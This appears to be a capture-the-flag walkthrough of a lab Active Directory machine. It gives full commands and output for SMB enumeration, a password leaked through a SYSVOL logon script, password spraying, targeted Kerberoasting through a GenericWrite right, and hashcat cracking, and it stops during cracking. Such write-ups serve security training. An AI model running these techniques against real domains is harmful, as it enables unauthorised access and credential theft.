Target : 10.129.234.69

```bash
>  sudo echo "10.129.234.69 delegate.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.234.69 delegate.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 10.129.234.69  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-25 11:24 +0200  
Nmap scan report for delegate.htb (10.129.234.69)  
Host is up (0.066s latency).  
Not shown: 65508 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-25 09:25:29Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
| ssl-cert: Subject: commonName=DC1.delegate.vl  
| Not valid before: 2026-05-24T09:22:48  
|_Not valid after:  2026-11-23T09:22:48  
| rdp-ntlm-info:    
|   Target_Name: DELEGATE  
|   NetBIOS_Domain_Name: DELEGATE  
|   NetBIOS_Computer_Name: DC1  
|   DNS_Domain_Name: delegate.vl  
|   DNS_Computer_Name: DC1.delegate.vl  
|   DNS_Tree_Name: delegate.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-05-25T09:26:34+00:00  
|_ssl-date: 2026-05-25T09:27:13+00:00; 0s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp  open  mc-nmf        .NET Message Framing  
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49664/tcp open  msrpc         Microsoft Windows RPC  
49665/tcp open  msrpc         Microsoft Windows RPC  
49666/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
49670/tcp open  msrpc         Microsoft Windows RPC  
49672/tcp open  msrpc         Microsoft Windows RPC  
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49676/tcp open  msrpc         Microsoft Windows RPC  
49682/tcp open  msrpc         Microsoft Windows RPC  
52091/tcp open  msrpc         Microsoft Windows RPC  
52100/tcp open  msrpc         Microsoft Windows RPC  
52122/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)  
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2026-05-25T09:26:37  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 157.48 seconds
```

We can see DNS (53) and Kerberos (88) open as well as Windows AD LDAP (389/3268) as well as SMB (445) as smb2 3.1.1. Netbios (139) is also open and there is a http server open on ports 5985 and 47001 as `Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)` with `http-server-header: Microsoft-HTTPAPI/2.0`.
We also have a `ms-wbt-server` open on port 3389 with 
`ssl-cert: Subject: commonName=DC1.delegate.vl` as the NetBIOS computer name is `DC1`  
and the DNS domain name is `delegate.vl`.
Microsoft RPC is open on several ports as well (135 and a bunch of other ports).
`593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 `


We'll start by adding the domain names to /etc/hosts and try to get the shares on SMB as guest.

```bash
>  echo "10.129.234.69 DC1.delegate.vl delegate.vl delegate.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.234.69 DC1.delegate.vl delegate.vl delegate.htb  
>  nxc smb 10.129.234.69 -u guest -p '' --shares  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest:    
SMB         10.129.234.69   445    DC1              [*] Enumerated shares  
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark  
SMB         10.129.234.69   445    DC1              -----           -----------     ------  
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin  
SMB         10.129.234.69   445    DC1              C$                              Default share  
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC  
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share    
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
```

We can see that we have no WRITE authorization, only READ on IPC$, NETLOGON and SYSVOL.

```bash
>  nxc smb 10.129.234.69 -u guest -p '' --spider NETLOGON  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest:    
SMB         10.129.234.69   445    DC1              [*] Spidering .  
>  nxc smb 10.129.234.69 -u guest -p '' --spider SYSVOL  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest:    
SMB         10.129.234.69   445    DC1              [*] Spidering .  
>  nxc smb 10.129.234.69 -u guest -p '' --spider IPC$  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest:    
SMB         10.129.234.69   445    DC1              [*] Spidering .
```

We can see that `spider` found no files inside the readable shares (which is normal for IPC$) but that doesn't mean there are no files inside.
We'll first try to login directly to NETLOGON using guest :

```bash
>  smbclient //10.129.234.69/NETLOGON -U guest -p ''  
Password for [WORKGROUP\guest]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Aug 26 14:45:24 2023  
 ..                                  D        0  Sat Aug 26 11:45:45 2023  
 users.bat                           A      159  Sat Aug 26 14:54:29 2023  
  
               4652287 blocks of size 4096. 1163804 blocks available  
smb: \> get users.bat  
getting file \users.bat of size 159 as users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)  
smb: \> exit  
>  cat users.bat  
rem @echo off  
net use * /delete /y  
net use v: \\dc1\development    
  
if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123%
```

We just got user:Administrator credentials from a simple READ autorization on a SMB share.

We try to get a shell :

```PowerShell
>  evil-winrm -i 10.129.234.69 -u Administrator -p 'P4ssw0rd1#123%'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\>
```

It freezes.

```PowerShell
>  evil-winrm -i 10.129.234.69 -u A.Briggs -p 'P4ssw0rd1#123%'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\>
```

```bash
>  nxc smb 10.129.234.69 -u Administrator -p 'P4ssw0rd1#123%' --shares  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [-] delegate.vl\Administrator:P4ssw0rd1#123% STATUS_LOGON_FAILURE

>  nxc smb 10.129.234.69 -u A.Briggs -p 'P4ssw0rd1#123%' --shares  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [-] delegate.vl\A.Briggs:P4ssw0rd1#123% STATUS_LOGON_FAILURE
```

So we find out the creds are wrong.

```bash
>  smbclient //10.129.234.69/SYSVOL -U guest  
Password for [WORKGROUP\guest]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Sep  9 15:52:30 2023  
 ..                                  D        0  Sat Aug 26 11:39:25 2023  
 delegate.vl                        Dr        0  Sat Aug 26 11:39:25 2023  
  
               4652287 blocks of size 4096. 1163791 blocks available  
smb: \> cd delegate.vl  
smb: \delegate.vl\> ls  
 .                                   D        0  Sat Aug 26 11:45:45 2023  
 ..                                  D        0  Sat Aug 26 11:39:25 2023  
 DfsrPrivate                      DHSr        0  Sat Aug 26 11:45:45 2023  
 Policies                            D        0  Sat Aug 26 11:39:30 2023  
 scripts                             D        0  Sat Aug 26 14:45:24 2023  
  
               4652287 blocks of size 4096. 1163791 blocks available  
smb: \delegate.vl\> cd Scripts  
smb: \delegate.vl\Scripts\> ls  
 .                                   D        0  Sat Aug 26 14:45:24 2023  
 ..                                  D        0  Sat Aug 26 11:45:45 2023  
 users.bat                           A      159  Sat Aug 26 14:54:29 2023  
  
               4652287 blocks of size 4096. 1163791 blocks available  
smb: \delegate.vl\Scripts\> get users.bat  
getting file \delegate.vl\Scripts\users.bat of size 159 as users.bat (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)  
smb: \delegate.vl\Scripts\> exit  
>  cat users.bat  
rem @echo off  
net use * /delete /y  
net use v: \\dc1\development    
  
if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123%
```

Same script, same credentials.

So we return as guest and try to do some more recon. Getting Admin creds so fast was suspicious anyways. We'll try to get users, shares and RIDs.

```bash
>  nxc smb 10.129.234.69 -u guest -p '' --users --groups --shares --rid-brute 5000  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest:    
SMB         10.129.234.69   445    DC1              [*] Enumerated shares  
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark  
SMB         10.129.234.69   445    DC1              -----           -----------     ------  
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin  
SMB         10.129.234.69   445    DC1              C$                              Default share  
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC  
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share    
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share    
SMB         10.129.234.69   445    DC1              [-] [REMOVED] Arg moved to the ldap protocol  
SMB         10.129.234.69   445    DC1              498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              500: DELEGATE\Administrator (SidTypeUser)  
SMB         10.129.234.69   445    DC1              501: DELEGATE\Guest (SidTypeUser)  
SMB         10.129.234.69   445    DC1              502: DELEGATE\krbtgt (SidTypeUser)  
SMB         10.129.234.69   445    DC1              512: DELEGATE\Domain Admins (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              513: DELEGATE\Domain Users (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              514: DELEGATE\Domain Guests (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              515: DELEGATE\Domain Computers (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              516: DELEGATE\Domain Controllers (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              517: DELEGATE\Cert Publishers (SidTypeAlias)  
SMB         10.129.234.69   445    DC1              518: DELEGATE\Schema Admins (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              519: DELEGATE\Enterprise Admins (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              525: DELEGATE\Protected Users (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              526: DELEGATE\Key Admins (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              527: DELEGATE\Enterprise Key Admins (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              553: DELEGATE\RAS and IAS Servers (SidTypeAlias)  
SMB         10.129.234.69   445    DC1              571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB         10.129.234.69   445    DC1              572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)  
SMB         10.129.234.69   445    DC1              1000: DELEGATE\DC1$ (SidTypeUser)  
SMB         10.129.234.69   445    DC1              1101: DELEGATE\DnsAdmins (SidTypeAlias)  
SMB         10.129.234.69   445    DC1              1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)  
SMB         10.129.234.69   445    DC1              1104: DELEGATE\A.Briggs (SidTypeUser)  
SMB         10.129.234.69   445    DC1              1105: DELEGATE\b.Brown (SidTypeUser)  
SMB         10.129.234.69   445    DC1              1106: DELEGATE\R.Cooper (SidTypeUser)  
SMB         10.129.234.69   445    DC1              1107: DELEGATE\J.Roberts (SidTypeUser)  
SMB         10.129.234.69   445    DC1              1108: DELEGATE\N.Thompson (SidTypeUser)  
SMB         10.129.234.69   445    DC1              1121: DELEGATE\delegation admins (SidTypeGroup)
```

`1104: DELEGATE\A.Briggs` we got our user, and a bunch of other users. Since P4ssw0rd1#123% didn't work on Administrator or on A. Briggs, we'll try to spray it to other users :

```bash
>  nxc smb 10.129.234.69 -u A.Briggs,b.Brown,R.Cooper,J.Roberts,N.Thompson -p 'P4ssw0rd1#123%' --shares  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs,b.Brown,R.Cooper,J.Roberts,N.Thompson:P4ssw0rd1#123% (Guest)  
SMB         10.129.234.69   445    DC1              [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

And access denied again.

So, we'll try to get from the users we got some hashes, hopefully :

```bash
cat > users.txt << 'EOF'

A.Briggs

b.Brown

R.Cooper

J.Roberts

N.Thompson

EOF
```


```bash
>  GetNPUsers.py delegate.vl/ -dc-ip 10.129.234.69 -usersfile users.txt -request -format hashcat -outputfile asrep.hashes  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[-] User A.Briggs doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User b.Brown doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User R.Cooper doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User J.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User N.Thompson doesn't have UF_DONT_REQUIRE_PREAUTH set  
>  nxc winrm 10.129.234.69 -u users.txt -p 'P4ssw0rd1#123%' --continue-on-success  
  
WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)    
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\A.Briggs:P4ssw0rd1#123%  
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\b.Brown:P4ssw0rd1#123%  
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\R.Cooper:P4ssw0rd1#123%  
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\J.Roberts:P4ssw0rd1#123%  
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\N.Thompson:P4ssw0rd1#123% 
 
>  mkdir -p sysvol_dump && smbclient //10.129.234.69/SYSVOL -U 'guest%' -c 'prompt OFF;recurse ON;lcd sysvol_dump;cd delegate.vl;mget *'  
  
NT_STATUS_ACCESS_DENIED listing \delegate.vl\DfsrPrivate\*  
getting file \delegate.vl\scripts\users.bat of size 159 as scripts/users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)  
getting file \delegate.vl\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)  
getting file \delegate.vl\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)  
getting file \delegate.vl\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2792 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (5.6 KiloBytes/sec) (average 1  
.8 KiloBytes/sec)  
getting file \delegate.vl\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windo  
ws NT/SecEdit/GptTmpl.inf (4.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)  
getting file \delegate.vl\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3956 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windo  
ws NT/SecEdit/GptTmpl.inf (8.1 KiloBytes/sec) (average 3.3 KiloBytes/sec)
```

So we downloaded everything in SYSVOL.

```bash
>  rg -n -i "password|pass=|net use|fileserver|cpassword" ./sysvol_dump  
./sysvol_dump/scripts/users.bat  
2:net use * /delete /y  
3:net use v: \\dc1\development    
5:if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123  
  
./sysvol_dump/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  
4:MinimumPasswordAge = 1  
5:MaximumPasswordAge = 42  
6:MinimumPasswordLength = 7  
7:PasswordComplexity = 1  
8:PasswordHistorySize = 24  
10:RequireLogonToChangePassword = 0  
12:ClearTextPassword = 0
```

So w e retry without the `%`.

```bash
>  nxc winrm 10.129.234.69 -u Administrator -p 'P4ssw0rd1#123'  
  
WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)    
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\Administrator:P4ssw0rd1#123  
>  nxc winrm 10.129.234.69 -u users.txt -p 'P4ssw0rd1#123' --continue-on-success  
  
WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)    
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\A.Briggs:P4ssw0rd1#123  
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\b.Brown:P4ssw0rd1#123  
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\R.Cooper:P4ssw0rd1#123  
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\J.Roberts:P4ssw0rd1#123  
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\N.Thompson:P4ssw0rd1#123
```

And it fails again.

We try on SMB :

```bash
>  nxc smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123' --shares  
  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123    
SMB         10.129.234.69   445    DC1              [*] Enumerated shares  
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark  
SMB         10.129.234.69   445    DC1              -----           -----------     ------  
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin  
SMB         10.129.234.69   445    DC1              C$                              Default share  
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC  
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share    
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
```

The credentials work for A.Briggs, but can't open a shell.

So we use Bloodhound :

```bash
>  bloodhound-python -u 'A.Briggs' -p 'P4ssw0rd1#123' -d delegate.vl -ns 10.129.234.69 -c all --zip
```

We find that A.Briggs has GenericWrite on N.Thompson :

```bash
>  python3 -c "  
import json  
p='$HOME/Delegate/20260525124428_bloodhound/20260525124428_users.json'  
briggs='S-1-5-21-1484473093-3449528695-2030935120-1104'  
for u in json.load(open(p))['data']:  
   for a in u.get('Aces',[]):  
       if a.get('PrincipalSID')==briggs:  
           print(u['Properties']['name'], '->', a['RightName'])  
"  
  
N.THOMPSON@DELEGATE.VL -> GenericWrite
```

```bash
>  bloodyad -d delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123' -H 10.129.234.69 -i 10.129.234.69 set object N.Thompson servicePrincipalName -v 'http/anything'  
  
/usr/share/bloodyad/bloodyAD/network/ldap.py:715: SyntaxWarning: 'return' in a 'finally' block  
 return search_results  
/usr/share/bloodyad/bloodyAD/network/ldap.py:770: SyntaxWarning: 'return' in a 'finally' block  
 return search_result  
[+] N.Thompson's servicePrincipalName has been updated
```

```bash
>  GetUserSPNs.py delegate.vl/'A.Briggs':'P4ssw0rd1#123' -dc-ip 10.129.234.69 -request -request-user N.Thompson -outputfile nt.hash  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
ServicePrincipalName  Name        MemberOf                                         PasswordLastSet             LastLogon                   Delegation    
--------------------  ----------  -----------------------------------------------  --------------------------  --------------------------  ----------  
http/anything         N.Thompson  CN=delegation admins,CN=Users,DC=delegate,DC=vl  2023-09-09 17:17:16.247262  2023-09-16 09:18:20.238500                
  
  
  
[-] CCache file is not found. Skipping...  
>  cat nt.hash  
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$4a26a5e5b62ff0fc462f1d3eb1e0eeb4$af539df668d04faa7b9b34ed42f3848935b2e0e91ba958c96b94a5f507aef6964a12c2f8f678d09e4d2817fad25c987ac2a05fa3ec6ef52462231  
20091278920224f127bc75cb33bc6243f38590e55796082eb9b0dc6a8e5cc769eae81066bb4986bb2523b8d45d83e49ec4c4dcfd2aa60b01ab762fe54e831ef7cf95d669cd933de729eb8be9d3dea591be8dc68ff03150157f79f751b3a708d16501eaf1bb6f8b8e45  
47f0a1fc7552d2dca662c58e6202f3458cbfba2ed0d61a415c68450915cc0c0f70e3cfba7c88509db793092295703d113b75664e5dc75e7e6fa353bb0e1fb0b36ec5d026bf89db88bcc435d604afdee13ce8a139701043e7b26a3be6439677ed595860cc1a36ec7ed2  
71eda9a011419b4f06be8fd7bf5090727a7ec52fe9e42631b9a246dbb0e7fb7f9ca56b6f764c91f7776e0d62dd86df7b79dcdbdeed9535a7de6eae6a51356b4fd8169756ef6c6d9973ab33cf7a58744489b8e3021a6d89e78787a320e7f9ae5c2a50431897ede15876  
855ae1be81a4861b13434548c4c1144ce5f4dd2279b58893014e4b8ec71967295ccdafc6c41eebdd02c58748eaeb9696e26f9aea9563c382eb51363cc4ab55f5136c017495a0c8995e7b392c64573f0210873a0210f3c753ff996aa2112d82d7027d66de024058abaf  
3bff15f911fb40fcd7670700f3a04885402728dc3ec21b6483800818cefa5153c5b8545af6f758eef77e7f90435f1e200d00d4cdad8c8967f160587d70b1c6a965b9c72ef7156166ea31110f1020b74558dfec35a7e46527101d732bf6102de011dbaca27e8eb03ae9  
4ea6dc8c9d34ed234d6a2234c602dda8990d04e748d370de2a1ba35e2cbcc68f015b534496f1ff278cf592ccec272dd0fc4ec167794bec10ef679eb10520de27f12c2eed15928ef455f185d6679e14e05ff24e46f947a1e99bd9276b9796f6e2b327033bc72b30985f  
6d76c0a54bc51f278b9bf59987a629e4fb0e9500afd34f329aef2f2301fe968c8c8c08fca3b326107ba5fe1571dc4d42d746bc398fd873ce6e01aba2b19d254a5cea297821cc7a6d2f869ffb3ba58fd6f73c664cebf12adbeb8e7bf710c31051b5cdddcedc8f6269f7  
5b46efcf7ad39f3b72583316b69b9e4f90a7d6f84c5a3cf8da5a061700121a8181b2fb9a552808d536678303842c2618c206e62c3684ec484708fe9912012801cbd75a4242b9e0dd64024515cbad4abcc0e265b44efe5a088b6d98242e6fa24012ff333531d644e6b1  
9a4a7b2f1c9489fcf20dae5f39758891b1d723671e0af8b4d1ae5714889db3f86cce403004ef0788914124e6fe727442ea46401bab1a13a90b3c5f5938f2525e0089793626bc60b0a1b446d64c4a9323b6607cbb3cfcee80eb6006ee94dad48b22803a7e09ae358cb4  
55ae36f9afef4efc6d899d3e05d32a42c5dd7b4cd7ae5a26f
```

We got a hash and crack it with `Kerberos TGS 23` mode as hash=$krb5tgs$23...

```bash
>  hashcat -m 13100 nt.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (11383 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$4a26a5e5b62ff0fc462f1d3eb1e0eeb4$af539df668d04faa7b9b34ed42f3848935b2e0e91ba958c96b94a5f507aef6964a12c2f8f678d09e4d2817fad25c987ac2a05fa3ec6ef52462231  
20091278920224f127bc75cb33bc6243f38590e55796082eb9b0dc6a8e5cc769eae81066bb4986bb2523b8d45d83e49ec4c4dcfd2aa60b01ab762fe54e831ef7cf95d669cd933de729eb8be9d3dea591be8dc68ff03150157f79f751b3a708d16501eaf1bb6f8b8e45  
47f0a1fc7552d2dca662c58e6202f3458cbfba2ed0d61a415c68450915cc0c0f70e3cfba7c88509db793092295703d113b75664e5dc75e7e6fa353bb0e1fb0b36ec5d026bf89db88bcc435d604afdee13ce8a139701043e7b26a3be6439677ed595860cc1a36ec7ed2  
71eda9a011419b4f06be8fd7bf5090727a7ec52fe9e42631b9a246dbb0e7fb7f9ca56b6f764c91f7776e0d62dd86df7b79dcdbdeed9535a7de6eae6a51356b4fd8169756ef6c6d9973ab33cf7a58744489b8e3021a6d89e78787a320e7f9ae5c2a50431897ede15876  
